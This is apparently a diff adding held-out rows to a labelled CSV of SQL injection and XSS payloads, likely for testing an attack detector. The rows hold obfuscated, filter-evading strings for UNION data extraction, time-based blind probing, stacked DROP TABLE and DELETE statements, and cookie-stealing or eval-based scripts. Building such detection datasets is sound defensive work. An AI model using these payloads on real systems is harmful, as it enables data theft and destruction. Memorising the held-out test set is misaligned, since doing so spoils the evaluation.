+"""/**_**/UNIoN%0aaLL%20SeLecT/*!*/0x78,0x78,name,0x78,balance FROM%09products%09-- 	",1,sqli,union,held_out
+'%20OR%20'a'lIKE'a'	%2d%2d ,1,sqli,boolean_blind,held_out
+"""><input onanimationstart=(alert)(1)>",1,xss,attribute,held_out
+"%27+UniOn+All/**_**/sElECT+role,NULL,balance,0x78%0aFROm sessions/**/-- -",1,sqli,union,held_out
+#<img onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
+"""%20UNIoN+ALl	selECT+0x78,NULL,0x78,CHAR(120)/*!*/frOm%0aproducts%09#",1,sqli,union,held_out
+`;+INSeRT	inTo	products%20vaLues(1)+%2d%2d ,1,sqli,stacked,held_out
+<detailsonerror=(alert)(1)>,1,xss,reflected,held_out
+"""/**/aNd (SELECT/**/1%0afrOM%20(SELECT(sLEEp(6)))x)-- -",1,sqli,time_blind,held_out
+"""onfocus=eval(atob('YWxlcnQoMSk='))x=""",1,xss,attribute,held_out
+1;%0aWaiTFOR/**/dELaY/*!*/'0:0:7'+-- -,1,sqli,time_blind,held_out
+"1/**_**/aND%0aupdatexml(1,concat(0x7e,(select/**/balance/**_**/from%09admins limit	1)),1)-- 	",1,sqli,error,held_out
+"'/**_**/UNiON+AlL/*!*/SelEct%09email,hash,CHAR(120)/**_**/FrOm%20products+%2d%2d ",1,sqli,union,held_out
+`+Or/*!*/email=0x726f6f74-- 	,1,sqli,hex_obf,held_out
+"""; updAtE/**/members%0aSet/*!*/name=1%0a-- ",1,sqli,stacked,held_out
+"'/*!*/UnION/*!*/ALL	SelEcT%0a0x78,NULL,0x78,NULL,role%0aFRoM%20admins+-- ",1,sqli,union,held_out
+"""/onbegin=alert(String.fromCharCode(88,83,83))/x=""",1,xss,attribute,held_out
+"')%20AnD+(select/**/count(*)+from/**/admins/*!*/group+by%0aconcat((select%09id/**_**/from%0amembers/**_**/limit%091),floor(rand(0)*2)))#",1,sqli,error,held_out
+"""%20onfocus=top['al'+'ert'](1)%20x=""",1,xss,attribute,held_out
+"1/**_**/ANd/**_**/(select%09count(*) from%0astaff%09group/**_**/by/*!*/concat((select/**_**/hash+from/**/members/**_**/limit%201),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
+""";/**/inSert%09iNTO tokens/**/VALuEs(1)/**/-- 	",1,sqli,stacked,held_out
+<math%20onstart=print%2528%2529>,1,xss,reflected,held_out
+"""/**_**/Or%0atoken=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
+"""><object ontoggle=alert(1)>",1,xss,attribute,held_out
+"%27/**/uNiON/**/alL/**/SeleCt/*!*/0x78,password,pwd%0aFRom+staff/**_**/-- 	",1,sqli,union,held_out
+"1 aND+updatexml(1,concat(0x7e,(select%0abalance%09from/**/admins/**/limit+1)),1)%2d%2d ",1,sqli,error,held_out
+"data:text/html,<details onload=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
+<svg%09onmouseover=eval%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529>,1,xss,reflected,held_out
+"""/onanimationstart=alert(String.fromCharCode(88,83,83))/x=""",1,xss,attribute,held_out
+"""%20And/*!*/(select/**_**/count(*)/*!*/from members/**_**/group/**/by	concat((select/*!*/email%0afrom/**_**/admins	limit/*!*/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
+<svg/onstart=top['al'+'ert'](1)>,1,xss,reflected,held_out
+""";%0aINSerT	InTO%20accounts/*!*/VAluEs(1)	#",1,sqli,stacked,held_out
+"%27/**_**/OR password=CHAR(117,110,105,111,110)#",1,sqli,hex_obf,held_out
+"""%09and/**_**/(select%09count(*)%0afrom%09accounts%20group/*!*/by%20concat((select/*!*/balance	from%20products	limit 1),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
+"'%20UnIoN+ALl%09SeLeCT/**/0x78,0x78,NULL,CHAR(120),NULL/**/from	members/**_**/-- ",1,sqli,union,held_out
+"%27%0aUNION%20ALL/**_**/SElEcT%09name,CHAR(120)	FRoM users/**/-- 	",1,sqli,union,held_out
+%27;%0aDEleTE FRom/*!*/members/*!*/-- ,1,sqli,stacked,held_out
+"""><object onstart=print()>",1,xss,attribute,held_out
+<sCrIpT>alert(document.cookie)</sCrIpT>,1,xss,reflected,held_out
+')%20or/**_**/token=0x726f6f74-- ,1,sqli,hex_obf,held_out
+'onfocus=(alert)(1)',1,xss,attribute,held_out
+')+Or/**_**/0x61=0x61 -- ,1,sqli,boolean_blind,held_out
+1;+delEte+fRom	sessions+-- 	,1,sqli,stacked,held_out
+"""%20and/**_**/updatexml(1,concat(0x7e,(select%09pwd/**_**/from users+limit/*!*/1)),1)-- 	",1,sqli,error,held_out
+"data:text/html,<math ontoggle=(alert)(1)>",1,xss,dom,held_out
+"data:text/html,<svg onmouseover=(alert)(1)>",1,xss,dom,held_out
+#<details onpointerover=window['ale'+'rt']`1`>,1,xss,dom,held_out
+<audioonerror=alert(document.cookie)>,1,xss,reflected,held_out
+`;/**_**/insERt%09iNTo%0aorders/**/vALUES(1)%09%2d%2d ,1,sqli,stacked,held_out
+')%0aor/**_**/sLEeP(8)/**/%2d%2d ,1,sqli,time_blind,held_out
+"'%09anD/*!*/(select%20count(*)%09from%20tokens%20group/**/by/*!*/concat((select%20role/*!*/from/**_**/products/*!*/limit/*!*/1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
+');/**/inserT/**_**/INTo/**/staff/**_**/vaLUEs(1)	%2d%2d ,1,sqli,stacked,held_out
+`/**/Or/**_**/balance=0x726f6f74#,1,sqli,hex_obf,held_out
+"' unioN+All/**/SeLEcT/*!*/NULL,NULL,CHAR(120)%09fROM%20tokens%20-- -",1,sqli,union,held_out
+') Or%0aid=0x756e696f6e/*z*/,1,sqli,hex_obf,held_out
+"%27+and%0a(select/**_**/count(*)	from+orders+group by/**_**/concat((select%20hash%0afrom products/**_**/limit/**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
+"""	or/**/sleeP(6)%0a/*z*/",1,sqli,time_blind,held_out
+');/*!*/uPdaTE clients/**/Set%20token=1/**/-- -,1,sqli,stacked,held_out
+"""><video onstart=window['ale'+'rt']`1`>",1,xss,attribute,held_out
+1;	DeLeTE%09fROM/**_**/users/*!*/-- -,1,sqli,stacked,held_out
+<body%09onerror=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+<svg/onfocus=alert(document.cookie)>,1,xss,reflected,held_out
+')%20oR%09SLeep(4)%20-- -,1,sqli,time_blind,held_out
+#<math onpointerover=top['al'+'ert'](1)>,1,xss,dom,held_out
+%27/*!*/Or/**/'b'likE'a'/*!*/%2d%2d ,1,sqli,boolean_blind,held_out
+""" OR%09token=0x726f6f74#",1,sqli,hex_obf,held_out
+'-alert(document.cookie)-',1,xss,attribute,held_out
+"`%09UnION%20ALl SELECT%0aCHAR(120),balance,0x78,password FrOm/**/members%20/*z*/",1,sqli,union,held_out
+<form	onfocus=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
+<iframe onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
+<svg/onstart=print()>,1,xss,reflected,held_out
+"%27+oR balance=CHAR(117,110,105,111,110)%2d%2d ",1,sqli,hex_obf,held_out
+1;%20UPdAte+tokens%09SEt+id=1/*!*/-- -,1,sqli,stacked,held_out
+""" onmouseover=alert(1) x=""",1,xss,attribute,held_out
+1;/*!*/DELete/**_**/froM/**/staff+-- ,1,sqli,stacked,held_out
+#<audio onmouseover=window['ale'+'rt']`1`>,1,xss,dom,held_out
+'); WAiTFOR%0adElaY%0a'0:0:5'%20-- ,1,sqli,time_blind,held_out
+"'%0aanD	updatexml(1,concat(0x7e,(select/**_**/token+from/*!*/orders/**/limit+1)),1)/*z*/",1,sqli,error,held_out
+<imgonbegin=alert%281%29>,1,xss,reflected,held_out
+""" onload=alert(String.fromCharCode(88,83,83)) x=""",1,xss,attribute,held_out
+"""><body onmouseover=(alert)(1)>",1,xss,attribute,held_out
+%27/*!*/or/**/0x61=0x61+-- ,1,sqli,boolean_blind,held_out
+%27+oR%20slEEP(7)/**_**/-- -,1,sqli,time_blind,held_out
+'-alert(1)-',1,xss,attribute,held_out
+"'-alert(String.fromCharCode(88,83,83))-'",1,xss,attribute,held_out
+<math	onfocus=print()><!--post-->,1,xss,stored,held_out
+'	onpointerover=window['ale'+'rt']`1`	',1,xss,attribute,held_out
+"'%09uNion%0aAlL%20SeleCT/**/CHAR(120),0x78,NULL,name,CHAR(120)/**_**/FrOM/**/members+#",1,sqli,union,held_out
+"1	ANd extractvalue(1,concat(0x7e,(select+password/**/from%20tokens limit/**_**/1)))#",1,sqli,error,held_out
+"""%0aUnion/*!*/ALl+SElEcT/**/NULL,0x78,id,0x78 fRom clients+#",1,sqli,union,held_out
+`	oR%20'a'liKe'a' -- -,1,sqli,boolean_blind,held_out
+#<video onpointerover=print()>,1,xss,dom,held_out
+"%27 unIOn/**/ALl+SELect/**_**/NULL,NULL,NULL+FROm%20staff%20-- -",1,sqli,union,held_out
+` OR/**/0x61=0x61/**/%2d%2d ,1,sqli,boolean_blind,held_out
+%27 or/*!*/'b'lIke'b'/**_**/-- ,1,sqli,boolean_blind,held_out
+<svg/onpointerover=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+`;/**/waiTFoR dELaY+'0:0:3'/**_**/-- ,1,sqli,time_blind,held_out
+"`/**/aNd/*!*/updatexml(1,concat(0x7e,(select%09pwd+from/**/admins%20limit/*!*/1)),1)%2d%2d ",1,sqli,error,held_out
+1;	waITfoR/**/dELay/**/'0:0:6'/*!*/-- -,1,sqli,time_blind,held_out
+`;%20UpdaTe%0astaff%0aSET id=1/**_**//*z*/,1,sqli,stacked,held_out
+<form onbegin=(alert)(1)>,1,xss,reflected,held_out
+"1%09AnD/*!*/(select count(*)/**/from/*!*/users	group%20by%0aconcat((select%0apwd/**/from staff/*!*/limit/**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
+"""; wAitfor/**/DELay+'0:0:7'/**_**/-- 	",1,sqli,time_blind,held_out
+"`+AND	extractvalue(1,concat(0x7e,(select role/*!*/from	users/**/limit%091)))#",1,sqli,error,held_out
+');%0adELEte%0afrOm%0aclients/*!*//*z*/,1,sqli,stacked,held_out
+"data:text/html,<input onanimationstart=top['al'+'ert'](1)>",1,xss,dom,held_out
+"')%09oR/**/role=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
+"') unIon/**/aLl/*!*/sElEct%0ahash,email/**_**/frOm%20staff+#",1,sqli,union,held_out
+<form onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
+'%20oR/*!*/'b'LIkE'b'/**_**/-- 	,1,sqli,boolean_blind,held_out
+%27/**/Or 2=4	-- -,1,sqli,boolean_blind,held_out
+"'%20AnD/*!*/extractvalue(1,concat(0x7e,(select/**_**/balance from%09products	limit/*!*/1)))-- 	",1,sqli,error,held_out
+')%09or%20token=0x61646d696e-- -,1,sqli,hex_obf,held_out
+""" onstart=top['al'+'ert'](1) x=""",1,xss,attribute,held_out
+#<form onanimationstart=window['ale'+'rt']`1`>,1,xss,dom,held_out
+%27%20Or%090x61=0x61 %2d%2d ,1,sqli,boolean_blind,held_out
+"%27/**/UNiOn/*!*/ALL/*!*/SEleCT/*!*/NULL,CHAR(120)	FrOm admins%20/*z*/",1,sqli,union,held_out
+"1%0aOr%20ssn=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
+1; dROp/*!*/table/**_**/tokens/*!*/-- ,1,sqli,stacked,held_out
+"')	unIoN+ALl%09sELect/**_**/CHAR(120),NULL,CHAR(120)%09from/**/members/*!*//*z*/",1,sqli,union,held_out
+';%20INsErt/**_**/INTO	sessions	VAlUes(1)	/*z*/,1,sqli,stacked,held_out
+"""	or%09sleEp(9) -- 	",1,sqli,time_blind,held_out
+'%0aOr%20ssn=0x73656c656374-- 	,1,sqli,hex_obf,held_out
+"""+UNion+all+SElEcT/**_**/ssn,NULL frOM/**_**/orders -- -",1,sqli,union,held_out
+'%09onstart=eval(atob('YWxlcnQoMSk='))%09',1,xss,attribute,held_out
+%27/**/Or	8beTWeEN/**/0%0aAND 9%09-- ,1,sqli,boolean_blind,held_out
+"data:text/html,<object onanimationstart=top['al'+'ert'](1)>",1,xss,dom,held_out
+<sCrIpT>top['al'+'ert'](1)</sCrIpT>,1,xss,reflected,held_out
+""";%20uPDaTE+orders%0aset	hash=1	/*z*/",1,sqli,stacked,held_out
+"data:text/html,<details ontoggle=window['ale'+'rt']`1`>",1,xss,dom,held_out
+"'+or+ssn=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
+<details	onstart=print()>,1,xss,reflected,held_out
+"""+oR/*!*/0x61=0x61	/*z*/",1,sqli,boolean_blind,held_out
+"""><audio onerror=(alert)(1)>",1,xss,attribute,held_out
+"<form
+onpointerover=alert(document.cookie)><!--stored-->",1,xss,stored,held_out
+"`/**/aNd/**/extractvalue(1,concat(0x7e,(select%0apassword%20from%20clients%0alimit+1)))#",1,sqli,error,held_out
+<iframe%20onload=print()>,1,xss,reflected,held_out
+' onstart=alert(document.cookie) ',1,xss,attribute,held_out
+javascript:window['ale'+'rt']`1`,1,xss,dom,held_out
+<form onload=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
+"data:text/html,<marquee onload=alert(1)>",1,xss,dom,held_out
+'%09or hash=0x73656c656374%2d%2d ,1,sqli,hex_obf,held_out
+<svg/onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+"""onload=alert(document.cookie)x=""",1,xss,attribute,held_out
+%27/*!*/AnD/**_**/(SELECT%0a1/**_**/frOM%0a(SELECT(sLEep(6)))x)-- -,1,sqli,time_blind,held_out
+%27; InsErt+INtO+staff+VaLuEs(1)+-- -,1,sqli,stacked,held_out
+"""%0auNiON/**/ALL%20seLecT 0x78,hash,CHAR(120),email,password FrOm+staff -- ",1,sqli,union,held_out
+'	And/*!*/(SELECT/**_**/1%20From (SELECT(SLEeP(7)))x)%2d%2d ,1,sqli,time_blind,held_out
+%27;%20WaItfOR delaY/*!*/'0:0:6'%0a-- 	,1,sqli,time_blind,held_out
+"` AnD/**/extractvalue(1,concat(0x7e,(select role from/**/orders%09limit%201)))-- ",1,sqli,error,held_out
+1 aND	(SELECT+1/**/fRoM (SELECT(SLEEP(7)))x)%2d%2d ,1,sqli,time_blind,held_out
+"%27/**/anD	updatexml(1,concat(0x7e,(select+pwd+from tokens%20limit+1)),1)#",1,sqli,error,held_out
+"""%0aor	'a'lIKe'a'%0a/*z*/",1,sqli,boolean_blind,held_out
+"' ANd/**_**/updatexml(1,concat(0x7e,(select/**_**/role%0afrom/*!*/orders	limit/**/1)),1)-- ",1,sqli,error,held_out
+"""+unIon aLl	SelEcT+ssn,0x78+from/*!*/sessions%09#",1,sqli,union,held_out
+' onbegin=top['al'+'ert'](1) ',1,xss,attribute,held_out
+"')%09Union/**_**/AlL SeLEcT	CHAR(120),0x78,token,id,CHAR(120)+fRoM/**_**/tokens/**/#",1,sqli,union,held_out
+1; waITfOr/*!*/DELAY%0a'0:0:4'%20-- 	,1,sqli,time_blind,held_out
+');/**/WaItfor%20DELAy/*!*/'0:0:5'/*!*/-- ,1,sqli,time_blind,held_out
+"<form
+onload=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
+<img%20onload=print()>,1,xss,reflected,held_out
+'/**/ANd (SELECT%0a1 FrOm%09(SELECT(SLEEP(4)))x)%2d%2d ,1,sqli,time_blind,held_out
+"1/**_**/uniOn%0aalL%09Select	NULL,NULL,NULL FROM sessions/**_**/-- -",1,sqli,union,held_out
+`;%09waITfoR%20dELAY/**/'0:0:9'%20-- ,1,sqli,time_blind,held_out
+1;	dELEte/**_**/froM+members%09-- 	,1,sqli,stacked,held_out
+"<details%20onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+`;/**_**/dELetE%0afROm%09orders%09/*z*/,1,sqli,stacked,held_out
+');%20UpDaTe/**_**/sessions/**/sET%0abalance=1/**/-- 	,1,sqli,stacked,held_out
+<input%09onbegin=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
+`%0aoR 0x61=0x61%20-- 	,1,sqli,boolean_blind,held_out
+<bodyonstart=alert(1)>,1,xss,reflected,held_out
+"""/**_**/or/*!*/password=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
+"%27%09unioN+aLL selEct 0x78,NULL,ssn from%09sessions/**/-- 	",1,sqli,union,held_out
+"data:text/html,<svg onerror=top['al'+'ert'](1)>",1,xss,dom,held_out
+')%20OR	SlEEp(9) #,1,sqli,time_blind,held_out
+"')	oR/**/password=CHAR(97,100,109,105,110)/*z*/",1,sqli,hex_obf,held_out
+"<sCrIpT>alert(String.fromCharCode(88,83,83))</sCrIpT>",1,xss,reflected,held_out
+`;	WaitFOr+deLAy '0:0:9'/*!*/-- -,1,sqli,time_blind,held_out
+"')+unIon%0aaLl%20seLeCt/*!*/password,name%09frOM+staff%09/*z*/",1,sqli,union,held_out
+"""%20or/**/4=5	%2d%2d ",1,sqli,boolean_blind,held_out
+"1%09UNiON/**_**/aLl%09SELeCt%20NULL,0x78,0x78,0x78/**_**/fRoM%20members	-- -",1,sqli,union,held_out
+"""/**/unIon%0aAll/**_**/sELECt%0aCHAR(120),NULL,NULL%20From staff+-- -",1,sqli,union,held_out
+`;/**_**/dElEtE%0afROM/**/sessions/**/-- -,1,sqli,stacked,held_out
+1/**/or/**/'a'LIKE'a'+/*z*/,1,sqli,boolean_blind,held_out
+"')/*!*/aND%0aupdatexml(1,concat(0x7e,(select	hash%09from/*!*/admins+limit%201)),1)%2d%2d ",1,sqli,error,held_out
+"""/*!*/unION%20All/**_**/selECT+NULL,CHAR(120)/**/FRoM	staff/*!*//*z*/",1,sqli,union,held_out
+<body/onpointerover=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
+"""><form onbegin=window['ale'+'rt']`1`>",1,xss,attribute,held_out
+<body	onfocus=print()><!--comment-->,1,xss,stored,held_out
+"%27 UNiON%0aaLL%09Select%09CHAR(120),NULL%20FRom%20sessions -- -",1,sqli,union,held_out
+1/**_**/ANd%09(SELECT	1/**/FrOm+(SELECT(slEEP(4)))x)/*z*/,1,sqli,time_blind,held_out
+"%27 uNiON	AlL%0aSeLEct CHAR(120),NULL,NULL,NULL fROm%20admins #",1,sqli,union,held_out
+"1	AnD/*!*/extractvalue(1,concat(0x7e,(select/**_**/role%09from	members+limit%201)))-- 	",1,sqli,error,held_out
+`; DrOp+taBLe%0ausers+-- 	,1,sqli,stacked,held_out
+"')	union/*!*/aLl/**/SELEct%09ssn,CHAR(120),0x78,0x78	FrOM%09tokens+-- 	",1,sqli,union,held_out
+"""/**_**/And%0aupdatexml(1,concat(0x7e,(select/*!*/email%20from%0asessions/**/limit	1)),1)#",1,sqli,error,held_out
+%27+oR%0aSLEep(4)/*!*/#,1,sqli,time_blind,held_out
+"%27	OR%0arole=CHAR(117,110,105,111,110)-- 	",1,sqli,hex_obf,held_out
+%27;	DROP/*!*/TAbLE/*!*/clients/*!*/#,1,sqli,stacked,held_out
+<video onanimationstart=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
+javascript:print(),1,xss,dom,held_out
+<img%20onpointerover=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
+"'/**_**/OR%09token=CHAR(114,111,111,116)-- ",1,sqli,hex_obf,held_out
+"""%09Or%20role=0x73656c656374-- ",1,sqli,hex_obf,held_out
+javascript:alert(1),1,xss,dom,held_out
+"`/*!*/unioN%0aALl%09sEleCT/**/0x78,NULL,0x78/**/FrOm%20orders%20-- 	",1,sqli,union,held_out
+<body/onbegin=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
+<videoonbegin=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
+""";	DEleTe/**/fROM staff+-- 	",1,sqli,stacked,held_out
+1;%20dElEte/*!*/frOM%20users%0a-- ,1,sqli,stacked,held_out
+"""; UPDATE members%20SEt/**/token=1%0a/*z*/",1,sqli,stacked,held_out
+<svg/onbegin=print()><!--post-->,1,xss,stored,held_out
+""";%0aWaiTFor/**_**/deLAY%0a'0:0:6'/**_**/-- -",1,sqli,time_blind,held_out
+<svg/onmouseover=window['ale'+'rt']`1`>,1,xss,reflected,held_out
+%27;/*!*/dELeTE+from/**_**/staff/**/-- ,1,sqli,stacked,held_out
+"""/**_**/or	sLeEP(3)	-- -",1,sqli,time_blind,held_out
+%27	or/*!*/token=0x726f6f74-- -,1,sqli,hex_obf,held_out
+"""	aNd updatexml(1,concat(0x7e,(select/**_**/balance/**/from	tokens/**/limit/*!*/1)),1)-- ",1,sqli,error,held_out
+`;%20uPDAtE sessions%0aSet/**/hash=1/**/-- 	,1,sqli,stacked,held_out
+"%27	unION%20aLL/*!*/SeLECT/*!*/CHAR(120),0x78,0x78+FRoM	members%0a-- 	",1,sqli,union,held_out
+"#"";eval(atob('YWxlcnQoMSk='));//",1,xss,dom,held_out
+"`%20anD updatexml(1,concat(0x7e,(select/*!*/id from/**_**/members/**/limit%201)),1)%2d%2d ",1,sqli,error,held_out
+`%0aOR/*!*/token=0x70617373776f7264/*z*/,1,sqli,hex_obf,held_out
+%27%20and%09(SELECT/**/1%09froM/**/(SELECT(SlEeP(3)))x)#,1,sqli,time_blind,held_out
+"""><video onload=eval(atob('YWxlcnQoMSk='))>",1,xss,attribute,held_out
+""" AnD+extractvalue(1,concat(0x7e,(select/*!*/role/**/from%09tokens+limit+1)))-- 	",1,sqli,error,held_out
+<math	ontoggle=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
+"data:text/html,<svg onfocus=alert(document.cookie)>",1,xss,dom,held_out
+#<input onanimationstart=print()>,1,xss,dom,held_out
+<iframe onpointerover=print()><!--post-->,1,xss,stored,held_out
+1+oR%090x61=0x61/*!*/-- -,1,sqli,boolean_blind,held_out
+"<inputonpointerover=alert(String.fromCharCode(88,83,83))><!--comment-->",1,xss,stored,held_out
+1/**_**/OR 8BETwEeN	0+ANd%099/**/#,1,sqli,boolean_blind,held_out
+"""><marquee onload=alert(String.fromCharCode(88,83,83))>",1,xss,attribute,held_out
+"%27%20anD/*!*/extractvalue(1,concat(0x7e,(select/**/ssn%20from	members/*!*/limit+1)))%2d%2d ",1,sqli,error,held_out
+<svg/onload=alert(document.cookie)>,1,xss,reflected,held_out
+"<math	onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+"""%20oR%20email=CHAR(112,97,115,115,119,111,114,100)#",1,sqli,hex_obf,held_out
+"<svg onstart=alert(String.fromCharCode(88,83,83))><!--comment-->",1,xss,stored,held_out
+<svgonstart=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
+"""/onload=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
+"""%20And/**/extractvalue(1,concat(0x7e,(select	ssn	from%20admins/**/limit%0a1)))#",1,sqli,error,held_out
+"""/onstart=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
+"""; uPDate/*!*/products%0aSEt id=1%0a-- 	",1,sqli,stacked,held_out
+1/*!*/or/*!*/9=1%09-- -,1,sqli,boolean_blind,held_out
+';/**/UPDaTE	sessions	Set pwd=1%20/*z*/,1,sqli,stacked,held_out
+';/*!*/dELEte/**/FROm/*!*/sessions%09-- ,1,sqli,stacked,held_out
+"1%20ANd/**/extractvalue(1,concat(0x7e,(select	token+from%0aproducts/**/limit%201)))/*z*/",1,sqli,error,held_out
+1%0aand/*!*/%28SELECT/**/1/**_**/frOm+(SELECT(SLeEP(5)))x)-- -,1,sqli,time_blind,held_out
+<iframe%09onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
+%27%20aND (SELECT/*!*/1/*!*/fROm%09(SELECT(sLEEP(7)))x)#,1,sqli,time_blind,held_out
+""";%09INSErT/**_**/INto%20orders/*!*/valUES(1)%20%2d%2d ",1,sqli,stacked,held_out
+"#"";window['ale'+'rt']`1`;//",1,xss,dom,held_out
+"')/*!*/uNion aLL/*!*/SeLECt/*!*/password,CHAR(120)%0afrOm/**/accounts%20-- -",1,sqli,union,held_out
+');%20dELEte FROM staff%09%2d%2d ,1,sqli,stacked,held_out
+<svg%20onbegin=alert(1)><!--post-->,1,xss,stored,held_out
+"""><video ontoggle=alert(1)>",1,xss,attribute,held_out
+<svg/onload=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+`;%09DElEtE%0afrom%0aclients/*!*/-- 	,1,sqli,stacked,held_out
+%27;/**_**/WaITFoR%0aDElAy%09'0:0:4'+#,1,sqli,time_blind,held_out
+<marquee/onpointerover=alert(1)>,1,xss,reflected,held_out
+"`%09oR/**/email=CHAR(115,101,108,101,99,116)-- ",1,sqli,hex_obf,held_out
+%27;%20wAITfOR%09DeLAy%20'0:0:5'%09-- ,1,sqli,time_blind,held_out
+'%20or%20'b'LiKe'a'/**_**/-- 	,1,sqli,boolean_blind,held_out
+"data:text/html,<video onmouseover=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
+"""/*!*/UNIoN/**_**/aLl/**_**/sElECT%09CHAR(120),CHAR(120),0x78,email+fRom%0astaff/**/#",1,sqli,union,held_out
+"""%09And	extractvalue(1,concat(0x7e,(select%0ahash/*!*/from orders%0alimit/**_**/1)))-- 	",1,sqli,error,held_out
+"'
+ontoggle=window['ale'+'rt']`1`
+'",1,xss,attribute,held_out
+%27+OR%0arole=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
+"data:text/html,<input onbegin=(alert)(1)>",1,xss,dom,held_out
+"')	OR+password=CHAR(117,110,105,111,110)/*z*/",1,sqli,hex_obf,held_out
+%27%20oR%0a6=8%20-- 	,1,sqli,boolean_blind,held_out
+"<video	onanimationstart=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
+"data:text/html,<body onfocus=window['ale'+'rt']`1`>",1,xss,dom,held_out
+1;%20delEtE/**_**/frOm orders/**//*z*/,1,sqli,stacked,held_out
+"""; inSERT/*!*/intO	sessions/**_**/valuES(1)/**/-- 	",1,sqli,stacked,held_out
+"""/*!*/UniOn	alL selEct/**_**/CHAR(120),NULL,NULL%09fRoM%09members/**_**/-- 	",1,sqli,union,held_out
+"%27	UniON	aLl seLEct%09CHAR(120),pwd%20FrOM%09tokens	%2d%2d ",1,sqli,union,held_out
+#<math ontoggle=alert(document.cookie)>,1,xss,dom,held_out
+"`+aND+updatexml(1,concat(0x7e,(select%20role	from%09tokens/**/limit/**_**/1)),1)-- 	",1,sqli,error,held_out
+1 or	token=0x756e696f6e-- 	,1,sqli,hex_obf,held_out
+"""><input onanimationstart=alert(1)>",1,xss,attribute,held_out
+"""/*!*/union	alL/*!*/SelECt/**/0x78,NULL	FrOM+sessions	%2d%2d ",1,sqli,union,held_out
+"<objectontoggle=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+1;	Drop/**/tABLe+products/**/%2d%2d ,1,sqli,stacked,held_out
+"'%0aUNION/*!*/aLl%0aSELect/**/0x78,NULL,role,NULL FROm/**/accounts	#",1,sqli,union,held_out
+<img%09onstart=alert(document.cookie)>,1,xss,reflected,held_out
+'%09oR+slEEP(6)/*!*/%2d%2d ,1,sqli,time_blind,held_out
+"""%20Or%09email=0x70617373776f7264-- ",1,sqli,hex_obf,held_out
+<math	ontoggle=alert(1)>,1,xss,reflected,held_out
+"`	anD (select/**_**/count(*)/**_**/from%09staff%20group%0aby/**_**/concat((select%20name/**_**/from/*!*/members/*!*/limit%0a1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
+1;%0adROp%09TAbLe%09tokens%09-- -,1,sqli,stacked,held_out
+');/**/DROP%0atABLe admins%20#,1,sqli,stacked,held_out
+'/*!*/OR%091=5%20#,1,sqli,boolean_blind,held_out
+`;%0awAItFOR	deLAy/**_**/'0:0:8' -- ,1,sqli,time_blind,held_out
+%27/**_**/oR/*!*/token=0x61646d696e-- 	,1,sqli,hex_obf,held_out
+'+Or/**/password=0x61646d696e/*z*/,1,sqli,hex_obf,held_out
+1/*!*/or 8beTWeen 0%0aANd/**/9%09-- -,1,sqli,boolean_blind,held_out
+"<form
+onfocus=(alert)(1)><!--comment-->",1,xss,stored,held_out
+`/**/Or%0abalance=0x61646d696e-- -,1,sqli,hex_obf,held_out
+"`/**/Or/**_**/role=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
+%27	OR/*!*/pwd=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
+`/**_**/oR/**/token=0x61646d696e-- 	,1,sqli,hex_obf,held_out
+1+Or/**/balance=0x70617373776f7264/*z*/,1,sqli,hex_obf,held_out
+%27%09oR%092betWeEN/*!*/0	AnD%0a9/*!*/-- -,1,sqli,boolean_blind,held_out
+"')/*!*/OR hash=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
+';/*!*/WaitfOR%20dELaY%20'0:0:4'%0a%2d%2d ,1,sqli,time_blind,held_out
+'; droP/*!*/TaBle/**/tokens/**_**/-- ,1,sqli,stacked,held_out
+#<math onbegin=print()>,1,xss,dom,held_out
+"')/*!*/AND extractvalue(1,concat(0x7e,(select	balance+from/**_**/members%0alimit/*!*/1)))%2d%2d ",1,sqli,error,held_out
+"')/**/UNiOn ALl%09sEleCT/**_**/0x78,0x78,NULL/**/fRoM%20orders -- ",1,sqli,union,held_out
+1%09OR+0x61=0x61/**_**/-- -,1,sqli,boolean_blind,held_out
+"""><iframe onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,attribute,held_out
